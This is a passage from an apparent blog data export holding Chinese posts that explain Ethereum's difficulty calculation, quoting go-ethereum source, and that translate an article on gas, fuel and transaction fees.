\n}\n```\n从上面的代码中可以提炼出以太坊的难度计算公式为：\n```\ndiff = (parent_diff +\n       (parent_diff / 2048 * max(1 - (block_timestamp - parent_timestamp) // 10, -99))\n       ) + 2^(block_number/100000 - 2)\n```\n也可以按照下面的公式理解：\n本区块的难度 = 父区块难度 + 难度调整值 + 难度炸弹\n难度调整值 = f(父区块难度，父区块产生时间，本区块产生时间）\n难度炸弹 = 2^（区块号/100000 -2）\n因此以太坊中挖矿难度与上一个区块难度直接相关，难度调整周期为一个区块。\n","slug":"以太坊挖矿之全网难度","published":1,"updated":"2018-03-16T10:56:20.929Z","layout":"post","photos":[],"link":"","_id":"cjf7piavj000tpkwof18s3uag","content":"<p>在<a href=\"http://c60block.com/2018/02/09/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E5%85%A8%E7%BD%91%E9%9A%BE%E5%BA%A6/\" target=\"_blank\" rel=\"noopener\">比特币挖矿之全网难度</a>中，已经提到比特币系统可以根据之前的全网算力动态调整难度，在一定程度上应对难度暴涨或者暴跌的情况，难度调整的周期为两周，那么在以太坊系统中，挖矿难度是如何调整的呢？调整的周期又是多少呢？带着这两个问题，我查找了以太坊对应的源码(go版本实现)。<br>以太坊中难度调整的代码在共识模块下的<a href=\"https://github.com/ethereum/go-ethereum/blob/d429a92f09e476c431830cef48690dc3784153c7/consensus/ethash/consensus.go#L297\" target=\"_blank\" rel=\"noopener\">CalcDifficulty</a>代码中，具体实现如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func CalcDifficulty(config *params.ChainConfig, time uint64, parent *types.Header) *big.Int &#123;</span><br><span class=\"line\">    next := new(big.Int).Add(parent.Number, big1)</span><br><span class=\"line\">    switch &#123;</span><br><span class=\"line\">    case config.IsByzantium(next):</span><br><span class=\"line\">        return calcDifficultyByzantium(time, parent)</span><br><span class=\"line\">    case config.IsHomestead(next):</span><br><span class=\"line\">        return calcDifficultyHomestead(time, parent)</span><br><span class=\"line\">    default:</span><br><span class=\"line\">        return calcDifficultyFrontier(time, parent)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>我们看到以太坊的难度计算有三种情况，这里只讨论第二种情况，对应以太坊当前的发展阶段homestead。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func calcDifficultyHomestead(time uint64, parent *types.Header) *big.Int &#123;</span><br><span class=\"line\">    // algorithm:</span><br><span class=\"line\">    // diff = (parent_diff +</span><br><span class=\"line\">    //        (parent_diff / 2048 * max(1 - (block_timestamp - parent_timestamp) // 10, -99))</span><br><span class=\"line\">    //        ) + 2^(periodCount - 2)</span><br><span class=\"line\"></span><br><span class=\"line\">    bigTime := new(big.Int).SetUint64(time)</span><br><span class=\"line\">    bigParentTime := new(big.Int).Set(parent.Time)</span><br><span class=\"line\"></span><br><span class=\"line\">    // holds intermediate values to make the algo easier to read &amp; audit</span><br><span class=\"line\">    x := new(big.Int)</span><br><span class=\"line\">    y := new(big.Int)</span><br><span class=\"line\"></span><br><span class=\"line\">    // 1 - (block_timestamp - parent_timestamp) // 10</span><br><span class=\"line\">    x.Sub(bigTime, bigParentTime)</span><br><span class=\"line\">    x.Div(x, big10)</span><br><span class=\"line\">    x.Sub(big1, x)</span><br><span class=\"line\"></span><br><span class=\"line\">    // max(1 - (block_timestamp - parent_timestamp) // 10, -99)</span><br><span class=\"line\">    if x.Cmp(bigMinus99) &lt; 0 &#123;</span><br><span class=\"line\">        x.Set(bigMinus99)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // (parent_diff + parent_diff // 2048 * max(1 - (block_timestamp - parent_timestamp) // 10, -99))</span><br><span class=\"line\">    y.Div(parent.Difficulty, params.DifficultyBoundDivisor)</span><br><span class=\"line\">    x.Mul(y, x)</span><br><span class=\"line\">    x.Add(parent.Difficulty, x)</span><br><span class=\"line\"></span><br><span class=\"line\">    // minimum difficulty can ever be (before exponential factor)</span><br><span class=\"line\">    if x.Cmp(params.MinimumDifficulty) &lt; 0 &#123;</span><br><span class=\"line\">        x.Set(params.MinimumDifficulty)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // for the exponential factor</span><br><span class=\"line\">    periodCount := new(big.Int).Add(parent.Number, big1)</span><br><span class=\"line\">    periodCount.Div(periodCount, expDiffPeriod)</span><br><span class=\"line\"></span><br><span class=\"line\">    // the exponential factor, commonly referred to as &quot;the bomb&quot;</span><br><span class=\"line\">    // diff = diff + 2^(periodCount - 2)</span><br><span class=\"line\">    if periodCount.Cmp(big1) &gt; 0 &#123;</span><br><span class=\"line\">        y.Sub(periodCount, big2)</span><br><span class=\"line\">        y.Exp(big2, y, nil)</span><br><span class=\"line\">        x.Add(x, y)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return x </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>从上面的代码中可以提炼出以太坊的难度计算公式为：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">diff = (parent_diff +</span><br><span class=\"line\">       (parent_diff / 2048 * max(1 - (block_timestamp - parent_timestamp) // 10, -99))</span><br><span class=\"line\">       ) + 2^(block_number/100000 - 2)</span><br></pre></td></tr></table></figure></p>\n<p>也可以按照下面的公式理解：<br>本区块的难度 = 父区块难度 + 难度调整值 + 难度炸弹<br>难度调整值 = f(父区块难度，父区块产生时间，本区块产生时间）<br>难度炸弹 = 2^（区块号/100000 -2）<br>因此以太坊中挖矿难度与上一个区块难度直接相关，难度调整周期为一个区块。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>在<a href=\"http://c60block.com/2018/02/09/%E6%AF%94%E7%89%B9%E5%B8%81%E6%8C%96%E7%9F%BF%E4%B9%8B%E5%85%A8%E7%BD%91%E9%9A%BE%E5%BA%A6/\" target=\"_blank\" rel=\"noopener\">比特币挖矿之全网难度</a>中，已经提到比特币系统可以根据之前的全网算力动态调整难度，在一定程度上应对难度暴涨或者暴跌的情况，难度调整的周期为两周，那么在以太坊系统中，挖矿难度是如何调整的呢？调整的周期又是多少呢？带着这两个问题，我查找了以太坊对应的源码(go版本实现)。<br>以太坊中难度调整的代码在共识模块下的<a href=\"https://github.com/ethereum/go-ethereum/blob/d429a92f09e476c431830cef48690dc3784153c7/consensus/ethash/consensus.go#L297\" target=\"_blank\" rel=\"noopener\">CalcDifficulty</a>代码中，具体实现如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func CalcDifficulty(config *params.ChainConfig, time uint64, parent *types.Header) *big.Int &#123;</span><br><span class=\"line\">    next := new(big.Int).Add(parent.Number, big1)</span><br><span class=\"line\">    switch &#123;</span><br><span class=\"line\">    case config.IsByzantium(next):</span><br><span class=\"line\">        return calcDifficultyByzantium(time, parent)</span><br><span class=\"line\">    case config.IsHomestead(next):</span><br><span class=\"line\">        return calcDifficultyHomestead(time, parent)</span><br><span class=\"line\">    default:</span><br><span class=\"line\">        return calcDifficultyFrontier(time, parent)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>我们看到以太坊的难度计算有三种情况，这里只讨论第二种情况，对应以太坊当前的发展阶段homestead。<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">func calcDifficultyHomestead(time uint64, parent *types.Header) *big.Int &#123;</span><br><span class=\"line\">    // algorithm:</span><br><span class=\"line\">    // diff = (parent_diff +</span><br><span class=\"line\">    //        (parent_diff / 2048 * max(1 - (block_timestamp - parent_timestamp) // 10, -99))</span><br><span class=\"line\">    //        ) + 2^(periodCount - 2)</span><br><span class=\"line\"></span><br><span class=\"line\">    bigTime := new(big.Int).SetUint64(time)</span><br><span class=\"line\">    bigParentTime := new(big.Int).Set(parent.Time)</span><br><span class=\"line\"></span><br><span class=\"line\">    // holds intermediate values to make the algo easier to read &amp; audit</span><br><span class=\"line\">    x := new(big.Int)</span><br><span class=\"line\">    y := new(big.Int)</span><br><span class=\"line\"></span><br><span class=\"line\">    // 1 - (block_timestamp - parent_timestamp) // 10</span><br><span class=\"line\">    x.Sub(bigTime, bigParentTime)</span><br><span class=\"line\">    x.Div(x, big10)</span><br><span class=\"line\">    x.Sub(big1, x)</span><br><span class=\"line\"></span><br><span class=\"line\">    // max(1 - (block_timestamp - parent_timestamp) // 10, -99)</span><br><span class=\"line\">    if x.Cmp(bigMinus99) &lt; 0 &#123;</span><br><span class=\"line\">        x.Set(bigMinus99)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // (parent_diff + parent_diff // 2048 * max(1 - (block_timestamp - parent_timestamp) // 10, -99))</span><br><span class=\"line\">    y.Div(parent.Difficulty, params.DifficultyBoundDivisor)</span><br><span class=\"line\">    x.Mul(y, x)</span><br><span class=\"line\">    x.Add(parent.Difficulty, x)</span><br><span class=\"line\"></span><br><span class=\"line\">    // minimum difficulty can ever be (before exponential factor)</span><br><span class=\"line\">    if x.Cmp(params.MinimumDifficulty) &lt; 0 &#123;</span><br><span class=\"line\">        x.Set(params.MinimumDifficulty)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    // for the exponential factor</span><br><span class=\"line\">    periodCount := new(big.Int).Add(parent.Number, big1)</span><br><span class=\"line\">    periodCount.Div(periodCount, expDiffPeriod)</span><br><span class=\"line\"></span><br><span class=\"line\">    // the exponential factor, commonly referred to as &quot;the bomb&quot;</span><br><span class=\"line\">    // diff = diff + 2^(periodCount - 2)</span><br><span class=\"line\">    if periodCount.Cmp(big1) &gt; 0 &#123;</span><br><span class=\"line\">        y.Sub(periodCount, big2)</span><br><span class=\"line\">        y.Exp(big2, y, nil)</span><br><span class=\"line\">        x.Add(x, y)</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return x </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>从上面的代码中可以提炼出以太坊的难度计算公式为：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">diff = (parent_diff +</span><br><span class=\"line\">       (parent_diff / 2048 * max(1 - (block_timestamp - parent_timestamp) // 10, -99))</span><br><span class=\"line\">       ) + 2^(block_number/100000 - 2)</span><br></pre></td></tr></table></figure></p>\n<p>也可以按照下面的公式理解：<br>本区块的难度 = 父区块难度 + 难度调整值 + 难度炸弹<br>难度调整值 = f(父区块难度，父区块产生时间，本区块产生时间）<br>难度炸弹 = 2^（区块号/100000 -2）<br>因此以太坊中挖矿难度与上一个区块难度直接相关，难度调整周期为一个区块。</p>\n"},{"title":"以太坊，燃气，燃料 和 费用（翻译）","comments":0,"date":"2018-03-01T08:20:06.000Z","img":null,"_content":"\n[来自 BTC Relay 的首席开发人员 Joseph Chow ：Ethereum,Gas,Fuel & Fees](https://media.consensys.net/ethereum-gas-fuel-and-fees-3333e17fe1dc)\n\n以太坊是分布式和诚实的应用程序的平台，可在没有任何管理员或单点故障的全球点对点网络上运行。这些应用程序没有停机时间，任何人都可以创建它们：这是无许可的创新。这些应用是诚实的，不可改变的，并且在编码时总是互操作。从这个角度来说，智能合约的术语是合理的，因为它们是始终遵循其创建时所设定的条款的最终合约。\n\n使这成为可能的核心实际上是世界计算机。在技术上称为以太坊虚拟机（EVM），它包括用于计算和数据存储的操作。交易代表世界计算机内的单个会话，它是交互的单位，类似于句子如何作为语法意义的单位，尽管单个句子可以包含很多单词。\n\n##  燃气（gas）是什么？\n\n燃气是世界计算机使用的计量单位。做一个类比，电量按千瓦小时计量，而在以太坊中使用更多的算力和存储代表着会使用更多的燃气。计量的一个基本原因是它可以激励人们（矿工）操作世界计算机。这些矿工对交易的处理会收取费用，费用则取决于计量方案：燃气。\n\nEVM 中的每个操作都会消耗燃气。例如，一个乘法（`MUL`）消耗 5 燃气而一个加法（`ADD`）消耗 3 燃气。[以太坊操作的燃气消耗表格](https://docs.google.com/spreadsheets/d/1m89CVujrQe5LAFJ8-YAUCcNK950dUzMQPMJBxRtGCqs/edit)\n\n**将燃气看做是燃料的代名词**\n\n计量与费用不同，而燃气和以太币也不同。为了帮助说清楚这个，将燃气看做是燃料的代名词。一笔交易必须提供足够的燃料，或者初始燃气，来支持 EVM 的计算和存储的使用。所有的剩余燃气会回退给交易的发起人：初始化该笔交易的用户。一笔燃料耗尽的交易会回滚，但是依旧包含在区块中，并且相关的费用依旧支付给矿工。\n\n了解了燃料角度的概述，让我们来看看费用相关的概述。在 EVM 中，每个操作都会消耗已经预定义数量的燃气（比如，一个乘法操作总是消耗 5 燃气），用户在每笔交易中都可以指定燃气价格。当前的燃气价格是 0.02μ 以太币，或者 0.00000002 ETH。交易发起人支付给矿工的费用是交易的 `(开始燃气 - 剩余燃气) * 燃气价格`。\n\n这里是一个关于交易燃料和交易费用的影响的总结：\n\n|    |燃料|费用|\n|------|-----|------|\n|通常|EVM 中的每个操作都会消耗一定数量预先已经设定好的燃料；用户不能更改它。每笔交易都有一个用户指定的初始燃气。|每笔交易都有用户指定的燃料价格（当前默认为每单位燃气 0.02μ ETH）|\n|交易开始时|交易发起人应该提供足够的燃料：初始燃气。剩余燃气 = 初始燃气。|交易发起人必须支付所有燃料。放置 `初始燃气 * 燃气价格 = 以太币` 在托管中。|\n|每个操作|剩余燃气会由于操作消耗而减少|知道交易完成（不论成功不成功），才会有后续的操作。|\n|不成功的交易|剩余燃气为零，还有未完成的操作。这导致一个燃气耗尽的异常，而所有的操作都会被撤销|所有托管的费用都会被支付给矿工|\n|成功的交易|所有剩余的燃气会回退给交易发起人|`（初始燃气 - 剩余燃气） * 燃气价格 = 费用` 支付给矿工；`剩余燃气 * 燃气价格` = 回退给交易发起人的费用。|\n\n在交易开始时，被要求用来作为初始燃气的以太币会被搁置，然后剩余燃气值会被设置为初始燃气值。随着交易中的每个操作，燃气会被消耗，剩余燃气逐渐变少。如果发生燃气耗尽的异常，所有的操作都会回滚，而之前搁置的所有的以太币都会被支付给矿工。如果交易成功执行完毕，所有的剩余部分的燃气会回退给交易发起人，而已经消耗的燃气则支付给矿工。\n\n## 简单的例子\n\n在下面的情景模拟中，假设存储消耗 45 燃气，一个加法操作消耗 10 燃气。这个场景涉及到在 EVM 中存储数字 31，将两个数相加，然后存储它们的和。让我们假设交易发起人指定了 150 的初始燃气，和 0.02μ 以太币的燃气价格。下面是 EVM 处理该笔交易的描述：\n\n|   |操作消耗的燃气|剩余燃气|\n|------|------|-------|\n|交易开始||150|\n|存储 31|45|105|\n|两个数相加|10|95|\n|存储和|45|50|\n|交易结束|数字 31 和 加法的和-|-已经被存储写入区块链|\n\n交易发起人支付给矿工的费用是：\n\n**（150–50) × 0.02µETH = 2µETH = 0.000002 ETH**\n\n## 燃料与费用\n\n交易发起人提供足够的燃料与提供足够的费用是有区别的。以下是对交易的可能影响：\n\n||燃料|费用|\n|---|---|---|\n|太低|不会广播给矿工（错误：`intrinsic gas too low`）|矿工不会执行计算|\n|低|少量计算或者燃料耗尽|之后会打包进区块|\n|中等|通常是理想的|通常是理想的|\n|高|可能导致打包被延迟|尽快被打包入区块|\n|太高|不会广播给矿工（错误：`exceeds block gas limit`）|如果交易发起人没有足够的以太币，则不会广播给矿工|\n\n尽管提供了费用，但是一笔燃料很低的交易甚至可能不会到达矿工处。如果一笔交易提供了足够的燃料，但是费用很低，即使该交易到达矿工处，当矿工看到这个费用之后也不会对其进行计算处理。费用决定了交易将被打包进入区块的顺序。而提供高燃料会导致交易打包时间更长的原因在本文中 *高初始燃气可能会导致延迟* 部分。\n\n## 初始燃气\n\n让我们讨论一下交易开始时的燃料需求。抽象地说，在被允许使用世界计算机的计算和存储之前，世界计算机需要知道交易发起人是否有能力支付费用。具体地说，在处理交易之前，矿工需要知道自己是否可以获得报酬。一笔交易需要指定它愿意花费的最大燃料值。对于本文的目的来说，这个需求被称作初始燃气。初始燃气是交易的重要部分。不幸的是，不同的文档使用了不同的词来描述这个关键部分：\n* [以太坊白皮书](https://github.com/ethereum/wiki/wiki/White-Paper)中使用了 初始燃气\n* [以太坊黄皮书](https://github.com/ethereum/yellowpaper)中使用了燃料限制\n* [Geth](https://github.com/ethereum/go-ethereum/releases) 和 [web3.js](https://github.com/ethereum/web3.js/releases) 等软件中，简单地使用了 “燃气”。\n\n因为在通常情况下，不真正运行计算（关联 [停机问题](https://en.wikipedia.org/wiki/Halting_problem)），矿工是不知道到底需要多少计算量的，所以初始燃气使事情变得更加简单（而不用 “燃气作为支付的消耗方式”（away from say a pay as gas is consumed approach） 这种说法）。作为一个以太坊应用的用户，必须提供初始燃气似乎很复杂，但开发人员可以使用一些工具来估计初始燃气并隐藏用户的详细信息。\n\n## 燃料耗尽异常\n\n一笔交易提供了它愿意消耗的最大燃料值。该燃气会被 EVM 中的每个操作消耗。如果燃料消耗完毕，而交易还未完成，那么一个燃料耗尽的异常就会发生。交易发起人为已经执行的操作支付，而交易也被打包进区块，但是所有的状态改变（比如合约的创建，值的存储，和[日志](https://media.consensys.net/technical-introduction-to-events-and-logs-in-ethereum-a074d65dd61e)的写入）都会回滚。\n\n让我们还是使用第一个例子作为场景，但是这次交易发起人指定初始燃气为 90（而不是 150）。这里是执行的示意图：\n\n||操作的燃料消耗|剩余燃料|\n|-----|-----|-----|\n|交易开始||90|\n|存储 31|45|45|\n|求和|10|35|\n|保存和|45|燃料耗尽|\n|交易结束|因为燃料耗尽，存储的 31 会回滚|耗尽|\n\n在交易开始时，交易发起人需要拿出所有燃料的资金： 初始燃气 * 燃气价格 = 存放在柜台的以太币。柜台中的以太币数量为：\n\n**90 × 0.02µETH = 1.8µETH**\n\n当每个操作执行时，燃气会消耗，而在存储和时产生了燃料耗尽异常。这会导致所有的操作撤销，代表数字 31 会被回滚到它之前存储的值，但是交易依旧被打包进入区块链，而且矿工获得所有的酬金：1.8μ ETH。\n\n## 燃气回退\n\nEVM 中有两个负值燃气的操作：\n* 清空合约是 -24000\n* 清空存储是 -15000\n\n当 EVM 执行了这样的一个操作，它将被记录在单独的退款计数器中。燃气退款仅在交易结束时提供。 此外，最高返还金额等于一半已经消耗的燃气。\n\n一个关键点在于，一笔交易的燃料永远不会增加。当 EVM 执行操作时，燃料总是减少（当一些合约或者存储被清空，退款计数器会增加）。如果燃料到零或者负数，那么立马会产生一个燃料耗尽异常：退款计数器中有多少燃气并不重要。一笔交易为了能够使用燃气退款，它必须避免燃料耗尽异常。假设一笔交易有足够的燃气，然后它就能使用退款计数器中的燃气。\n\n退款的燃气值最多为消耗的燃气值的一半。例如，如果一笔交易使用了 60000 燃气，然后清空了 2 个合约而获得 48000 的一笔退款（每笔 24000），交易发起人还是需要支付给矿工 30000 燃气。这激励了矿工使用负值燃气操作处理交易，因为这给了他们收入，并确保了矿工不可能为他人的计算付款。\n\n## 区块燃气限制（Block gas limit:BGL）\n\n回顾一下，初始燃气由用户指定，是一笔交易将要消耗的燃料最大值。那么一个区块中能够容纳多少交易呢？答案是直到所有交易的初始燃气总和达到区块燃气限制（BGL）为止。当前(2016/6/23)的 BGL 是 4,712,388 （1.5π 的数字形式），表示能够在一个区块（平均出块时间 15 秒）中容纳 224 笔初始燃气为 21000 的交易。为了防止像比特币一样对区块是否变大产生分歧，以太坊协议允许矿工对自己的区块往任意方向进行 1/1024(0.0976%) 幅度的 BGL 调整。与协议不同的是默认的采矿策略，其最小 BGL 为 4,712,388。\n\n## 高初始燃气可能存在的延迟\n\n既然燃料耗尽异常对交易发起人来说几乎是在浪费金钱，那么将初始燃气设置得更高总是更好的。所以，交易发起人为什么不总是将初始燃气指定为 4,000,000 呢？\n\n答案在于交易的初始燃气和它实际消耗的燃气之间的差异。矿工只会获得一笔交易实际消耗的燃气；所有未使用的燃气会被回退给交易发起人。\n\n如果同时存在一笔初始燃气为 4M 的交易和 100 笔初始燃气为 40,000 的交易，矿工可能会选择后者，因为这 100 笔交易的收入有更高的预测性。如果一笔初始燃气为 4M 的交易实际只消耗了 1M 燃气，那么矿工将损失 3M 的潜在燃气收入。所以，矿工更愿意优先考虑一些“小”交易，而不是拥有高初始燃气（除非[内在气体](https://github.com/ethereum/pyethereum/blob/3841e9a406f4ca9452afa45035fb07b5ce6314d9/ethereum/transactions.py#L177)也十分高）的一笔交易。这会导致高初始燃气的交易在被打包之前存在延迟，并且也解释了过高的初始燃气可能会是有害的。\n\n## 绕过交易所\n\n以太坊有两种类型的账户：\n* 用户账户（由私钥控制）\n* 合约（由代码控制）\n\n发送以太币到一个用户账户需要 21000 的燃气费用，而发送以太币到合约则需要更高的费用，这个费用取决于合约代码和交易中发送的数据。一些交易所会对他们所有的交易都只提供 21000 燃气，这表示在用户想要从交易所发送以太币到他们 Mist（以太坊钱包） 中的合约钱包时，交易会耗尽燃料，以太币永远也不会发送到用户的合约钱包。\n\n## 计量和费用\n\n关于计量和费用之间的区别还有一点需要注意。在比特币中，计量是根据字节来的：交易中的字节数。在以太坊中，计算也需要计量，因为少量的代码也可能被编码成永远执行。计量计算量也是使用燃气的一个原因。但是拥有燃气不代表需要费用。\n\n比如，在一个私链上，每个账户每天可以拥有 X 燃气，或者是每笔交易 Y 燃气，或者其他方案。另一方面，有费用不代表需要燃气：费用可以基于不同的计量，如字节。对于公有链上的安全性来说，燃气和费用两者都需要，而替代方案可能更适合私有链（比如，对于任何人都可以创建账户的公有链来说，每个账户每天有 X 燃气，可以被“女巫攻击”（Sybil-attacked））。\n\n## 结论\n\n燃气是使用世界计算机的计量方式和燃料，与使用世界计算机所支付的以太币费用是不同的。提供足够的燃料和足够的费用，两者之间是有区别的。运行时燃料耗尽会花费钱，而提供更多的燃气会使得更加安全，反正所有的未使用的燃气都会被回退。燃气是以太坊的核心部分，它的大多数话题已经被讨论过。这里有更多关于它的信息，包括[估计燃气](https://github.com/ethereum/wiki/wiki/JavaScript-API#web3ethestimategas)，内在燃气（intrinsic gas），[燃气价格预告（gas price oracle）](https://github.com/ethereum/go-ethereum/wiki/Gas-Price-Oracle)，[交易大小的影响](https://ethereum.stackexchange.com/questions/1106/is-there-a-limit-for-transaction-size)，读者可以在本文的基础上进一步地探索和理解。\n","source":"_posts/以太坊，燃气，燃料-和-费用.md","raw":"---\ntitle: 以太坊，燃气，燃料 和 费用（翻译）\ncomments: false\ndate: 2018-03-01 16:20:06\ncategories: 区块链\ntags:\n- ZhouFyk \n- 区块链 \n- 以太坊 \n- 燃料 \n- gas \n- 翻译\nimg:\n---\n\n[来自 BTC Relay 的首席开发人员 Joseph Chow ：Ethereum,Gas,Fuel & Fees](https://media.consensys.net/ethereum-gas-fuel-and-fees-3333e17fe1dc)\n\n以太坊是分布式和诚实的应用程序的平台，可在没有任何管理员或单点故障的全球点对点网络上运行。这些应用程序没有停机时间，任何人都可以创建它们：这是无许可的创新。这些应用是诚实的，不可改变的，并且在编码时总是互操作。从这个角度来说，智能合约的术语是合理的，因为它们是始终遵循其创建时所设定的条款的最终合约。\n\n使这成为可能的核心实际上是世界计算机。在技术上称为以太坊虚拟机（EVM），它包括用于计算和数据存储的操作。交易代表世界计算机内的单个会话，它是交互的单位，类似于句子如何作为语法意义的单位，尽管单个句子可以包含很多单词。\n\n##  燃气（gas）是什么？\n\n燃气是世界计算机使用的计量单位。做一个类比，电量按千瓦小时计量，而在以太坊中使用更多的算力和存储代表着会使用更多的燃气。计量的一个基本原因是它可以激励人们（矿工）操作世界计算机。这些矿工对交易的处理会收取费用，费用则取决于计量方案：燃气。\n\nEVM 中的每个操作都会消耗燃气。例如，一个乘法（`MUL`）消耗 5 燃气而一个加法（`ADD`）消耗 3 燃气。[以太坊操作的燃气消耗表格](https://docs.google.com/spreadsheets/d/1m89CVujrQe5LAFJ8-YAUCcNK950dUzMQPMJBxRtGCqs/edit)\n\n**将燃气看做是燃料的代名词**\n\n计量与费用不同，而燃气和以太币也不同。为了帮助说清楚这个，将燃气看做是燃料的代名词。一笔交易必须提供足够的燃料，或者初始燃气，来支持 EVM 的计算和存储的使用。所有的剩余燃气会回退给交易的发起人：初始化该笔交易的用户。一笔燃料耗尽的交易会回滚，但是依旧包含在区块中，并且相关的费用依旧支付给矿工。\n\n了解了燃料角度的概述，让我们来看看费用相关的概述。在 EVM 中，每个操作都会消耗已经预定义数量的燃气（比如，一个乘法操作总是消耗 5 燃气），用户在每笔交易中都可以指定燃气价格。当前的燃气价格是 0.02μ 以太币，或者 0.00000002 ETH。交易发起人支付给矿工的费用是交易的 `(开始燃气 - 剩余燃气) * 燃气价格`。\n\n这里是一个关于交易燃料和交易费用的影响的总结：\n\n|    |燃料|费用|\n|------|-----|------|\n|通常|EVM 中的每个操作都会消耗一定数量预先已经设定好的燃料；用户不能更改它。每笔交易都有一个用户指定的初始燃气。|每笔交易都有用户指定的燃料价格（当前默认为每单位燃气 0.02μ ETH）|\n|交易开始时|交易发起人应该提供足够的燃料：初始燃气。剩余燃气 = 初始燃气。|交易发起人必须支付所有燃料。放置 `初始燃气 * 燃气价格 = 以太币` 在托管中。|\n|每个操作|剩余燃气会由于操作消耗而减少|知道交易完成（不论成功不成功），才会有后续的操作。|\n|不成功的交易|剩余燃气为零，还有未完成的操作。这导致一个燃气耗尽的异常，而所有的操作都会被撤销|所有托管的费用都会被支付给矿工|\n|成功的交易|所有剩余的燃气会回退给交易发起人|`（初始燃气 - 剩余燃气） * 燃气价格 = 费用` 支付给矿工；`剩余燃气 * 燃气价格` = 回退给交易发起人的费用。|\n\n在交易开始时，被要求用来作为初始燃气的以太币会被搁置，然后剩余燃气值会被设置为初始燃气值。随着交易中的每个操作，燃气会被消耗，剩余燃气逐渐变少。如果发生燃气耗尽的异常，所有的操作都会回滚，而之前搁置的所有的以太币都会被支付给矿工。如果交易成功执行完毕，所有的剩余部分的燃气会回退给交易发起人，而已经消耗的燃气则支付给矿工。\n\n## 简单的例子\n\n在下面的情景模拟中，假设存储消耗 45 燃气，一个加法操作消耗 10 燃气。这个场景涉及到在 EVM 中存储数字 31，将两个数相加，然后存储它们的和。让我们假设交易发起人指定了 150 的初始燃气，和 0.02μ 以太币的燃气价格。下面是 